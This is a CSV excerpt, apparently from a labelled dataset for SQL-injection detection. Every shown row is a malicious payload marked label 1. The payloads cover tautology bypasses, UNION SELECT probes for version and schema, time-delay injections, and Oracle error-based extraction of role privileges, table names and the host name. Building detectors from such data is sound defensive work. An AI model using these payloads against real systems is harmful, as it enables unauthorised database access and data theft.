row_index,payload_norm,label,sqli_type_hint
330,"select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1",1,
331,"union select * from users where login = char ( 114,111,111,116 ) ;",1,
332,"select * from users where id = 1 or 1#""? union select 1,version ( ) -- 1",1,
333,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",1,
334,pg_sleep ( __TIME__ ) --,1,
335,‘ or 3 = 3 --,1,
336,"select * from users where id = 1 -1<@ union select 1,version ( ) -- 1",1,
337,"select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",1,
338,) union select * from information_schema.tables;,1,
339,"select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1",1,
340,") or benchmark ( 10000000,MD5 ( 1 ) ) #",1,
341,AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( column_name ) ) FROM sys.all_tab_columns ) ) AND 'i' = 'i,1,
342,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",1,
343,""" or """" """,1,
344,delete,1,
345,;waitfor delay '0:0:__TIME__'--,1,
346, or 1 = 1 --,1,
347,1' and non_existant_table = '1,1,
348,"select * from users where id = 1 or ""& ) "" or 1 = 1 -- 1",1,
349,"select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'",1,
350,declare @s varchar ( 200 ) select @s = 0x77616974 ...,1,
351,x' AND userid IS NULL; --,1,
352,"select * from users where id = 1 or "";["" or 1 = 1 -- 1",1,
353,"select * from users where id = '1' or \.< = 1 union select 1,@@VERSION -- 1'",1,
354,"select * from users where id = 1 union select @<@,version ( ) -- 1",1,
355,"select * from users where id = 1 -@<@ union select 1,version ( ) -- 1",1,
356,AND 1 = utl_inaddr.get_host_address ( ( SELECT host_name FROM v$instance ) ) AND 'i' = 'i,1,
357,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",1,
358,select * from users where id = 1 + ( \+ ) or 1 = 1 -- 1,1,
359,"select * from users where id = 1 or "".["" or 1 = 1 -- 1",1,
